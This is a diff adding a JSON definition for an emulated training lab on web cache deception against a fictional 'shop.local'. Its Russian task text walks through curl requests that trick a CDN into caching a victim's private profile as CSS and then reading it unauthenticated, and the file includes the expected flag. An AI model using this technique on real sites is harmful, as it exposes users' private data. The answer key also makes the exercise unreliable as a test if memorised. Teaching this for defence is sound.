@@ -1,0 +1,39 @@
+{
+  "id": "web-cache-deception",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{c4ch3_d3c3pt10n_l34ks_y0ur_pr0f1l3}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Web Cache Deception\n\n`shop.local` за CDN. Приватный профиль `/profile/me` кэшировать нельзя, но\nесли попросить его как «статику» (`/profile/me.css`), кэш сохранит ответ —\nвместе с секретным полем профиля.\n\n1. Приватный профиль (не кэшируется):\n   curl -s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'\n   (Cache-Control: private, no-store)\n2. Просим тот же профиль как CSS — путь сбивает кэш с толку:\n   curl -s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'\n   (X-Cache: MISS, Cache-Control: public — ответ закэширован)\n3. Теперь читаем кэш БЕЗ авторизации — отдаётся профиль жертвы с секретом:\n   curl -s 'http://shop.local/profile/me.css'\n4. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/profile)",
+      "cases": [
+        {
+          "match": "profile/me\\.css.*session=victim123",
+          "example": "-s -i 'http://shop.local/profile/me.css' -H 'Cookie: session=victim123'",
+          "output": "HTTP/1.1 200 OK\nCache-Control: public, max-age=300\nX-Cache: MISS\nContent-Type: text/css\n\n{\"user\":\"victim\",\"name\":\"Vic Tim\",\"recovery_secret\":\"nto{c4ch3_d3c3pt10n_l34ks_y0ur_pr0f1l3}\"}\n"
+        },
+        {
+          "match": "profile/me\\.css",
+          "example": "-s 'http://shop.local/profile/me.css'",
+          "output": "HTTP/1.1 200 OK\nCache-Control: public, max-age=300\nX-Cache: HIT\nContent-Type: text/css\n\n{\"user\":\"victim\",\"name\":\"Vic Tim\",\"recovery_secret\":\"nto{c4ch3_d3c3pt10n_l34ks_y0ur_pr0f1l3}\"}\n"
+        },
+        {
+          "match": "profile/me",
+          "example": "-s -i 'http://shop.local/profile/me' -H 'Cookie: session=victim123'",
+          "output": "HTTP/1.1 200 OK\nCache-Control: private, no-store\nContent-Type: application/json\n\n{\"user\":\"victim\",\"name\":\"Vic Tim\",\"email\":\"v@shop.local\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /profile/me и /profile/me.css на shop.local.\n"
+    }
+  }
+}
